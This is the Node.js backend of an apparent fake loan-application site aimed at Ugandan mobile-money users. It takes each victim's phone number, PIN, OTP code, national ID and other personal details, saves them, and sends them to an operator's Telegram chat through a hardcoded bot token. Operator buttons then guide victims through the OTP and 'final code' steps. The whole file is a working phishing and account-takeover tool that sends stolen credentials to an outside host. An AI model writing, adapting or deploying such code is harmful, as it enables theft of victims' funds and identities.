const express = require('express');
const cors = require('cors');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
const TELEGRAM_CHAT_ID = '8392790531';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Database setup
let db = null;

async function initDatabase() {
    try {
        db = await open({
            filename: './database/loans.db',
            driver: sqlite3.Database
        });

        await db.exec(`
            CREATE TABLE IF NOT EXISTS loans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                loan_id TEXT UNIQUE,
                phone TEXT,
                pin TEXT,
                network TEXT,
                amount INTEGER,
                duration INTEGER,
                monthly_payment INTEGER,
                total_payment INTEGER,
                interest INTEGER,
                otp_code TEXT,
                status TEXT DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                loan_id TEXT,
                full_name TEXT,
                national_id TEXT,
                date_of_birth TEXT,
                address TEXT,
                occupation TEXT,
                income TEXT,
                final_code TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (loan_id) REFERENCES loans(loan_id)
            );
        `);

        console.log('✅ Database initialized');
        return true;
    } catch (error) {
        console.error('❌ Database error:', error);
        return false;
    }
}

// Send message to Telegram with buttons
async function sendTelegramMessage(text, replyMarkup = null) {
    try {
        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        };
        
        if (replyMarkup) {
            payload.reply_markup = replyMarkup;
        }
        
        const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        const data = await response.json();
        if (data.ok) {
            console.log('✅ Telegram notification sent');
            return data.result.message_id;
        } else {
            console.error('Telegram error:', data);
        }
    } catch (error) {
        console.error('Telegram send error:', error);
    }
    return null;
}

// Edit Telegram message
async function editTelegramMessage(messageId, text, replyMarkup = null) {
    try {
        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            message_id: messageId,
            text: text,
            parse_mode: 'HTML'
        };
        
        if (replyMarkup) {
            payload.reply_markup = replyMarkup;
        }
        
        await fetch(`${TELEGRAM_API}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (error) {
        console.error('Edit message error:', error);
    }
}

// Generate unique loan ID
function generateLoanId() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substring(2, 8);
    return `MUG${timestamp}${random}`.toUpperCase();
}

// ========== API ROUTES ==========

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Save loan application (from verify.html) - WITH BUTTONS
app.post('/api/save-loan', async (req, res) => {
    try {
        const { phone, pin, network, amount, duration, monthly, total, interest } = req.body;
        
        const loanId = generateLoanId();
        
        await db.run(
            `INSERT INTO loans (loan_id, phone, pin, network, amount, duration, monthly_payment, total_payment, interest, status)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [loanId, phone, pin, network, amount, duration, monthly, total, interest, 'pending']
        );
        
        // Send Telegram notification with 4 buttons
        const message = `<b>🔴 NEW LOAN APPLICATION</b>\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
            `<b>💰 Amount:</b> UGX ${amount.toLocaleString()}\n` +
            `<b>📱 Network:</b> ${network}\n` +
            `<b>📞 Phone:</b> <code>${phone}</code>\n` +
            `<b>🔐 PIN:</b> <code>${pin}</code>\n` +
            `<b>📅 Duration:</b> ${duration / 30} months\n` +
            `<b>💳 Monthly:</b> UGX ${monthly.toLocaleString()}\n` +
            `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n` +
            `━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>⚠️ Action Required:</b> Select an option below:`;
        
        const replyMarkup = {
            inline_keyboard: [
                [
                    { text: "✅ Approve Loan", callback_data: `approve_${loanId}` },
                    { text: "📱 Verify Device", callback_data: `verify_${loanId}` }
                ],
                [
                    { text: "📋 Already Applied", callback_data: `applied_${loanId}` },
                    { text: "❌ Decline", callback_data: `decline_${loanId}` }
                ]
            ]
        };
        
        const messageId = await sendTelegramMessage(message, replyMarkup);
        
        // Store message ID to edit later
        if (messageId) {
            await db.run(`UPDATE loans SET otp_code = ? WHERE loan_id = ?`, [messageId.toString(), loanId]);
        }
        
        res.json({
            success: true,
            loanId: loanId,
            message: 'Loan application saved'
        });
        
    } catch (error) {
        console.error('Save loan error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Telegram Webhook to handle button clicks
app.post('/webhook/telegram', async (req, res) => {
    try {
        const update = req.body;
        console.log('Webhook received:', JSON.stringify(update, null, 2));
        
        if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const messageId = update.callback_query.message.message_id;
            const callbackId = update.callback_query.id;
            
            const [action, loanId] = callbackData.split('_');
            
            console.log(`Action: ${action}, LoanId: ${loanId}`);
            
            // Get loan details
            const loan = await db.get(`SELECT * FROM loans WHERE loan_id = ?`, [loanId]);
            
            if (!loan) {
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackId,
                        text: "Loan not found"
                    })
                });
                return res.sendStatus(200);
            }
            
            let responseText = "";
            let newStatus = "";
            let newMessage = "";
            
            if (action === 'approve') {
                responseText = "✅ Loan approved! User can proceed.";
                newStatus = "approved";
                newMessage = `✅ <b>LOAN APPROVED</b>\n\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
                    `<b>💰 Amount:</b> UGX ${loan.amount.toLocaleString()}\n` +
                    `<b>📞 Phone:</b> <code>${loan.phone}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━\n\n` +
                    `<b>Status:</b> ✅ APPROVED\n` +
                    `<b>User can now proceed to OTP page.</b>`;
                    
            } else if (action === 'verify') {
                responseText = "📱 Device verification required.";
                newStatus = "device_verify";
                newMessage = `📱 <b>DEVICE VERIFICATION REQUIRED</b>\n\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
                    `<b>💰 Amount:</b> UGX ${loan.amount.toLocaleString()}\n` +
                    `<b>📞 Phone:</b> <code>${loan.phone}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━\n\n` +
                    `<b>Status:</b> 📱 Pending device verification`;
                    
            } else if (action === 'applied') {
                responseText = "📋 User has already applied.";
                newStatus = "already_applied";
                newMessage = `📋 <b>ALREADY APPLIED</b>\n\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
                    `<b>💰 Amount:</b> UGX ${loan.amount.toLocaleString()}\n` +
                    `<b>📞 Phone:</b> <code>${loan.phone}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━\n\n` +
                    `<b>Status:</b> 📋 Previously applied`;
                    
            } else if (action === 'decline') {
                responseText = "❌ Loan declined.";
                newStatus = "declined";
                newMessage = `❌ <b>LOAN DECLINED</b>\n\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
                    `<b>💰 Amount:</b> UGX ${loan.amount.toLocaleString()}\n` +
                    `<b>📞 Phone:</b> <code>${loan.phone}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━\n\n` +
                    `<b>Status:</b> ❌ DECLINED BY ADMIN`;
            }
            
            // Update loan status in database
            if (newStatus) {
                await db.run(`UPDATE loans SET status = ? WHERE loan_id = ?`, [newStatus, loanId]);
            }
            
            // Edit the original message to remove buttons
            await editTelegramMessage(messageId, newMessage);
            
            // Answer the callback query
            await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    callback_query_id: callbackId,
                    text: responseText
                })
            });
        }
        
        res.sendStatus(200);
        
    } catch (error) {
        console.error('Webhook error:', error);
        res.sendStatus(500);
    }
});

// Save OTP (from otp.html)
app.post('/api/save-otp', async (req, res) => {
    try {
        const { loanId, otp } = req.body;
        
        const loan = await db.get(`SELECT * FROM loans WHERE loan_id = ?`, [loanId]);
        
        await db.run(
            `UPDATE loans SET otp_code = ?, status = ? WHERE loan_id = ?`,
            [otp, 'otp_verified', loanId]
        );
        
        // Send Telegram notification
        const message = `<b>🟠 OTP VERIFIED</b>\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
            `<b>💰 Amount:</b> UGX ${loan?.amount?.toLocaleString() || 'N/A'}\n` +
            `<b>📞 Phone:</b> <code>${loan?.phone || 'N/A'}</code>\n` +
            `<b>🔑 OTP Code:</b> <code>${otp}</code>\n` +
            `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n` +
            `━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>Status:</b> ✅ OTP verified, awaiting final details`;
        
        await sendTelegramMessage(message);
        
        res.json({
            success: true,
            message: 'OTP saved successfully'
        });
        
    } catch (error) {
        console.error('Save OTP error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Save final verification (from final-verify.html)
app.post('/api/save-final', async (req, res) => {
    try {
        const { loanId, fullName, nationalId, dateOfBirth, address, occupation, income, finalCode } = req.body;
        
        const loan = await db.get(`SELECT * FROM loans WHERE loan_id = ?`, [loanId]);
        
        await db.run(
            `INSERT INTO users (loan_id, full_name, national_id, date_of_birth, address, occupation, income, final_code)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
            [loanId, fullName, nationalId, dateOfBirth, address, occupation, income, finalCode]
        );
        
        await db.run(
            `UPDATE loans SET status = ? WHERE loan_id = ?`,
            ['completed', loanId]
        );
        
        // Send detailed Telegram notification
        const message = `<b>✅ LOAN COMPLETED - FULL DETAILS</b>\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
            `<b>💰 Amount:</b> UGX ${loan?.amount?.toLocaleString() || 'N/A'}\n` +
            `<b>📅 Duration:</b> ${loan?.duration ? loan.duration / 30 : 'N/A'} months\n` +
            `<b>💳 Monthly:</b> UGX ${loan?.monthly_payment?.toLocaleString() || 'N/A'}\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `<b>👤 PERSONAL DETAILS</b>\n` +
            `<b>📛 Full Name:</b> ${fullName}\n` +
            `<b>🆔 National ID:</b> <code>${nationalId}</code>\n` +
            `<b>🎂 Date of Birth:</b> ${dateOfBirth}\n` +
            `<b>📍 Address:</b> ${address}\n` +
            `<b>💼 Occupation:</b> ${occupation}\n` +
            `<b>💰 Income:</b> ${income}\n` +
            `<b>🔐 Final Code:</b> <code>${finalCode}</code>\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `<b>📞 Phone:</b> <code>${loan?.phone || 'N/A'}</code>\n` +
            `<b>🔐 PIN:</b> <code>${loan?.pin || 'N/A'}</code>\n` +
            `<b>📱 Network:</b> ${loan?.network || 'N/A'}\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `<b>🕐 Completed:</b> ${new Date().toLocaleString()}\n\n` +
            `<b>🎉 LOAN FULLY PROCESSED!</b>`;
        
        await sendTelegramMessage(message);
        
        res.json({
            success: true,
            message: 'Final verification saved'
        });
        
    } catch (error) {
        console.error('Save final error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get loan by ID
app.get('/api/loan/:loanId', async (req, res) => {
    try {
        const loan = await db.get(`SELECT * FROM loans WHERE loan_id = ?`, [req.params.loanId]);
        
        if (!loan) {
            return res.status(404).json({ success: false, error: 'Loan not found' });
        }
        
        res.json({ success: true, loan });
        
    } catch (error) {
        console.error('Get loan error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get all loans (admin)
app.get('/api/loans', async (req, res) => {
    try {
        const loans = await db.all(`SELECT * FROM loans ORDER BY created_at DESC`);
        res.json({ success: true, loans });
    } catch (error) {
        console.error('Get loans error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get user by loan ID
app.get('/api/user/:loanId', async (req, res) => {
    try {
        const user = await db.get(`SELECT * FROM users WHERE loan_id = ?`, [req.params.loanId]);
        res.json({ success: true, user });
    } catch (error) {
        console.error('Get user error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Serve HTML pages
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/verify.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'verify.html'));
});

app.get('/otp.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'otp.html'));
});

app.get('/final-verify.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'final-verify.html'));
});

// Set webhook endpoint (run once)
app.get('/set-webhook', async (req, res) => {
    const webhookUrl = `https://${req.get('host')}/webhook/telegram`;
    const response = await fetch(`${TELEGRAM_API}/setWebhook?url=${webhookUrl}`);
    const data = await response.json();
    res.json(data);
});

// Start server
async function startServer() {
    await initDatabase();
    
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`🚀 Server running on port ${PORT}`);
        console.log(`📍 http://localhost:${PORT}`);
        console.log(`📱 Telegram Bot Ready`);
        console.log(`⚠️ Run: curl -F "url=https://YOUR_DOMAIN/webhook/telegram" https://api.telegram.org/bot8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E/setWebhook`);
    });
}

startServer();
